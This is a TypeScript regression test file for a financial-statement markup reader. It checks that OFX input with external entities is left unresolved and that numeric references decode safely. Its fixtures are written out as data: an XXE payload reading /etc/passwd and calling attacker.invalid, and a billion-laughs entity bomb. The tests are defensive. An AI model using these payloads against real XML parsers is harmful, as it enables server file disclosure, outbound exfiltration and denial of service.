import { describe, expect, it } from 'vitest';
import { readOfx } from '../src/index';
import { decodeEntities, readMarkup } from '../src/import/markup';

/**
 * The regression test §8.7 asks for by name.
 *
 * The plan's line is "XML parsers (OFX 2.x, CAMT) configured with entity
 * resolution and external DTDs disabled. Dedicated regression test." Altitude
 * has no XML library to configure, so there is nothing switched off that a
 * dependency bump could switch back on - the reader in `markup.ts` skips a
 * document type declaration and knows six entity names, and everything else
 * comes back as the characters it was written with.
 *
 * That is a stronger position than a configured parser and a weaker test: a
 * setting is visible in a diff, and "we never wrote the code" is visible in
 * nothing at all. Somebody adding CAMT.054 in a year has every reason to reach
 * for a library and no reason to know why this one did not. Hence this file,
 * which fails loudly the moment an entity starts resolving.
 *
 * Every figure below is invented.
 */

/**
 * An OFX 2.x file carrying the classic payload.
 *
 * One entity pointing at a local file and one at a URL, then a reference to
 * each in a place whose text is persisted: a description reaches
 * `transactions.description` and a memo reaches an entry. If either resolved,
 * the contents of a file on the server would be written into the ledger of
 * whoever uploaded this, and the request to `attacker.invalid` would have gone
 * out before anybody saw a preview.
 */
const XXE = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE OFX [
  <!ENTITY stolen SYSTEM "file:///etc/passwd">
  <!ENTITY reached SYSTEM "http://attacker.invalid/collect?q=1">
]>
<OFX>
  <BANKMSGSRSV1><STMTTRNRS><STMTRS>
    <CURDEF>EUR</CURDEF>
    <BANKACCTFROM><ACCTID>00012345678</ACCTID></BANKACCTFROM>
    <BANKTRANLIST>
      <STMTTRN>
        <TRNTYPE>DEBIT</TRNTYPE>
        <DTPOSTED>20260105</DTPOSTED>
        <TRNAMT>-42.10</TRNAMT>
        <FITID>2026010500001</FITID>
        <NAME>&stolen;</NAME>
        <MEMO>&reached;</MEMO>
      </STMTTRN>
    </BANKTRANLIST>
  </STMTRS></STMTTRNRS></BANKMSGSRSV1>
</OFX>`;

describe('a file that declares its own entities', () => {
  const reading = readOfx(XXE);

  it('leaves a reference to one exactly as it was written', () => {
    expect(reading.candidates[0]?.description).toBe('&stolen;');
    expect(reading.candidates[0]?.entries[0]?.memo).toBe('&reached;');
  });

  it('reads the transaction around them, rather than refusing the file', () => {
    // The other half of the countermeasure. A parser that threw on a document
    // type declaration would be safe and useless: a bank is free to emit one,
    // and refusing the file would send somebody looking for a problem with
    // their statement.
    expect(reading.candidates).toHaveLength(1);
    expect(reading.candidates[0]?.bookedOn).toBe('2026-01-05');
    expect(reading.candidates[0]?.entries[0]?.amount).toBe('-42.1');
    expect(reading.problems).toEqual([]);
  });

  it('builds no node out of the declaration', () => {
    const root = readMarkup(XXE);
    const tags: string[] = [];
    const walk = (node: { tag: string; children: readonly { tag: string }[] }) => {
      for (const one of node.children) {
        tags.push(one.tag);
        walk(one as never);
      }
    };
    walk(root);

    // Neither the DOCTYPE nor either ENTITY is an element, and a tolerant
    // reader that turned one into a container would nest the whole document
    // inside something nobody wrote.
    expect(tags).not.toContain('!DOCTYPE');
    expect(tags).not.toContain('!ENTITY');
    expect(tags.filter((tag) => tag.startsWith('!'))).toEqual([]);
  });
});

describe('an entity that defines itself in terms of itself', () => {
  /**
   * The billion laughs, which is the denial-of-service half of the same
   * vector: ten nested definitions expand to a gigabyte of text and take the
   * process with them. Nothing here expands anything, so the file below reads
   * as the four characters it contains.
   */
  const bomb = `<?xml version="1.0"?>
<!DOCTYPE OFX [
  <!ENTITY a "aaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<OFX><X>&d;</X></OFX>`;

  it('expands nothing, so the text stays the size it arrived', () => {
    const root = readMarkup(bomb);
    const x = root.children[0]?.children[0];

    expect(x?.tag).toBe('X');
    expect(x?.value).toBe('&d;');
  });
});

describe('a numeric character reference', () => {
  it('decodes the ones that name a character', () => {
    expect(decodeEntities('INT&#201;R&#234;TS')).toBe('INTÉRêTS');
    expect(decodeEntities('&#x20AC;120')).toBe('€120');
    expect(decodeEntities('&#8364;120')).toBe('€120');
  });

  it('decodes the six names these formats use', () => {
    expect(decodeEntities('INTERETS &amp; AGIOS')).toBe('INTERETS & AGIOS');
    expect(decodeEntities('&lt;&gt;&quot;&apos;')).toBe('<>"\'');
  });

  it('leaves a name it was not taught', () => {
    expect(decodeEntities('&eacute;')).toBe('&eacute;');
  });

  it('leaves one past the end of Unicode, rather than throwing on it', () => {
    // `String.fromCodePoint` raises a RangeError above 0x10FFFF. Uncaught, one
    // malformed reference in one memo refuses a file whose four hundred other
    // transactions are perfectly readable - which is a denial of service that
    // costs an attacker fourteen characters.
    expect(() => decodeEntities('&#9999999;')).not.toThrow();
    expect(decodeEntities('&#9999999;')).toBe('&#9999999;');
    expect(decodeEntities('&#x110000;')).toBe('&#x110000;');
  });

  it('leaves half of a surrogate pair', () => {
    // Legal to build in JavaScript and not legal to store: PostgreSQL refuses
    // an unpaired surrogate as invalid UTF-8, so this would pass every check in
    // the importer and fail at the last step, on the write.
    expect(decodeEntities('&#xD800;')).toBe('&#xD800;');
    expect(decodeEntities('&#xDFFF;')).toBe('&#xDFFF;');
    // The character just past the range still decodes, so what is guarded
    // against is the surrogates rather than a rounded-off region near them.
    expect(decodeEntities('&#xE000;')).toHaveLength(1);
  });

  it('leaves a run of digits too long to be one', () => {
    expect(decodeEntities('&#99999999999999999999;')).toBe('&#99999999999999999999;');
  });
});
